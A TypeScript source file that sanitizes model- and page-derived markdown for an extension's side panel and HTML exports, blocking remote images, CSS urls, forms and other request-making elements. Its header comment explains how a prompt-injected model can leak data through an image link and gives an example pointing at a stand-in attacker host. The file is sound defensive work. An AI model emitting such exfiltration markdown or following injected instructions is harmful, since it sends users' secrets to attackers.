// =============================================================================
// The one HTML sanitizer for model- and page-derived markdown, used by the side
// panel (Markdown.tsx) and by the HTML exports (conversation / knowledge base).
//
// DOMPurify's defaults stop script execution but still allow anything that
// makes a request on render: <img src="https://…">, CSS url() in style
// attributes, <video poster>, srcset, SVG <image>. A prompt-injected model can
// use any of those to send what it has read to an attacker's server with no
// click — `![](https://evil.example/p?d=<secret>)` — so they are removed here.
// Images survive only as data:/blob: URLs, which can't carry anything out.
// Forms and inputs are removed too, so a reply can't draw a fake sign-in box.
// =============================================================================

import DOMPurify from 'dompurify';
import { marked } from 'marked';

marked.setOptions({ gfm: true, breaks: true });

/** Image sources that make no network request. */
const SAFE_IMAGE_SRC = /^\s*(data:image\/|blob:)/i;

const CONFIG = {
  USE_PROFILES: { html: true }, // no SVG / MathML (SVG <image>, <use> can fetch)
  FORBID_TAGS: ['form', 'input', 'button', 'textarea', 'select', 'option', 'style', 'audio', 'video', 'source', 'track', 'picture'],
  FORBID_ATTR: ['style', 'background', 'srcset', 'poster', 'action', 'formaction', 'ping'],
};

let hooksInstalled = false;

function installHooks(): void {
  if (hooksInstalled) return;
  hooksInstalled = true;
  DOMPurify.addHook('afterSanitizeAttributes', (node) => {
    if (node.tagName === 'A') {
      // Links must open in a real tab, not navigate the panel.
      node.setAttribute('target', '_blank');
      node.setAttribute('rel', 'noopener noreferrer');
    }
    if (node.tagName === 'IMG') {
      const src = node.getAttribute('src') ?? '';
      if (!SAFE_IMAGE_SRC.test(src)) {
        const alt = (node.getAttribute('alt') ?? '').trim();
        node.removeAttribute('src');
        node.setAttribute('alt', alt ? `[remote image not loaded: ${alt}]` : '[remote image not loaded]');
        node.setAttribute('class', 'blocked-image');
      }
    }
  });
}

/** Sanitize already-rendered HTML with the shared, request-free policy. */
export function sanitizeHtml(html: string): string {
  installHooks();
  return DOMPurify.sanitize(html, CONFIG) as unknown as string;
}

/** Render markdown to sanitized HTML. */
export function renderSafeMarkdown(text: string): string {
  return sanitizeHtml(marked.parse(text, { async: false }));
}

/**
 * CSP for exported HTML files, which open from disk without the extension's
 * CSP. No scripts, no network loads; inline styles only for the page's own
 * stylesheet and generated SVG.
 */
export const EXPORT_CSP_META =
  `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src data: blob:; ` +
  `style-src 'unsafe-inline'; form-action 'none'; base-uri 'none'">`;
